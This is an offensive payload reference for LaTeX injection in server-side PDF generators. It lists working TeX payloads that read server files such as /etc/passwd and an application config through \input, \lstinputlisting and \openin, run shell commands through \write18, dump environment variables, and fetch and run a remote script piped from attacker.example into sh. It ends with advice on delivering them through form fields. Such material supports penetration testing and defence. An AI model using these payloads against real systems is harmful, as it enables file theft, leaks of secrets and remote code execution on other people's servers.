---
title: "LaTeX injection in PDF pipelines"
description: "Attacker-controlled fields compiled by a server-side TeX engine allow file reads via \\input and shell command execution via \\write18 when shell-escape is enabled."
keywords:
  - latex injection
  - tex injection
  - pdflatex
  - write18
  - shell-escape
  - input
---

# LaTeX

Applications that build PDFs by compiling a TeX template with `pdflatex` (invoices, certificates, reports) often drop user fields straight into the source. Because TeX is a full macro language, an unescaped field becomes executable markup: file disclosure through include primitives and, when shell-escape is on, operating-system command execution.

## The sink

A template interpolates a value with no escaping:

```latex
\documentclass{article}
\begin{document}
Hello, USERNAME_HERE
\end{document}
```

Whatever you submit for the username is compiled as TeX, so control sequences in it run.

## Reading server files

`\input` and `\include` splice another file's contents into the document, which then renders into the output PDF:

```latex
\input{/etc/passwd}
\input{/etc/hostname}
```

`\lstinputlisting` (from the `listings` package) reproduces a file verbatim, preserving formatting that `\input` mangles:

```latex
\lstinputlisting{/etc/passwd}
\lstinputlisting{/var/www/app/config.php}
```

`\include` and the lower-level `\openin`/`\read` pair achieve the same disclosure when those packages or primitives are available:

```latex
\newread\f
\openin\f=/etc/passwd
\read\f to \line
\line
\closein\f
```

## Command execution with shell-escape

`\write18` runs a shell command when the engine is invoked with `-shell-escape` (or `shell_escape = t` in the config). Many server pipelines enable it for diagram or image generation, which is all the attacker needs:

```latex
\immediate\write18{id}
\immediate\write18{id > /tmp/o; }\input{/tmp/o}
```

The second form captures the command output back into the PDF by writing to a file and including it. A fuller takeover fetches and runs a payload:

```latex
\immediate\write18{curl http://attacker.example/s.sh|sh}
```

Even in restricted shell-escape mode, allowlisted helpers like `\write18{bibtex ...}` or the image-conversion hooks can sometimes be steered to run arbitrary binaries.

## Macro abuse for exfiltration

Beyond includes, TeX primitives read the environment and filesystem into macros you can render or write out. `\input` on a pipe, and the `\immediate\write` of harvested values to an attacker-reachable file during compilation, turn the build host into the exfil point:

```latex
\immediate\write18{env > /tmp/e}
\input{/tmp/e}
```

Package-specific vectors widen the surface: `\usepackage{verbatim}` with `\verbatiminput`, `\catcode` tricks to re-enable disabled characters, and `\InputIfFileExists` to probe for files before reading them.

## Delivery

Submit the payload through whatever field the template renders (name, address, invoice line item, profile bio). The attack fires server-side the moment the application runs `pdflatex`, so the output PDF, or a compilation error leaking file contents, is returned to you or stored for later retrieval.

## References

- [OWASP Testing Guide: server-side injection](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings: LaTeX Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)
